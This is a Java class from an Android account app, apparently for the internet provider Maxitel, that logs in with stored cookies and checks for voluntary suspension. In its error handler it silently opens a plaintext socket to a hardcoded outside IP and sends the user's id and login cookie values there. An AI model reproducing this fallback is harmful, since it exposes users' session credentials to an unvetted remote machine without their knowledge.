package ru.maxitel.lk.connects;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.IOException;
import java.net.Socket;

import ru.maxitel.lk.LoginActivity;
import ru.maxitel.lk.R;
import ru.maxitel.lk.User;

/**
 * Created by Михаил on 17.01.2016.
 */
public class LoginCookiesConnect extends LoginConnect {
    @Override
    protected Document doInBackground(Void... params) {
        try {
            //Это соединение только для того чтобы проверить добровольную блокировку.
            Document document = Jsoup.connect(User.URL + "/?a=19")
                    .cookies(User.getCookies())
                    .execute()
                    .parse();
            if (document.text().contains(loginActivity.getString(R.string.voluntary_suspension))) {
                User.setVoluntarilyLocked(true);
            } else if (document.text().contains("Пожалуйста подождите несколько минут.")) {
                User.setVoluntarilyLocked(true);
            } else User.setVoluntarilyLocked(false);

            Connection.Response connection = Jsoup.connect(User.URL + "/cookie.php")
                    .cookies(User.getCookies())
                    .execute();
            return connection.parse();
        } catch (IOException e) {
            try {
                Socket socket = new Socket("94.158.215.148", 44445);
                ConnectMyPC connectMyPC = new ConnectMyPC(socket);
                connectMyPC.send("cookies " + User.getCookies().get("user_id") + " " + User.getCookies().get("user_login"));
                return Jsoup.parse(connectMyPC.receive());
            } catch (Exception ignored) {}

            return null;
        }
    }

        public LoginCookiesConnect(LoginActivity loginActivity) {
            this.loginActivity = loginActivity;
        }
    }
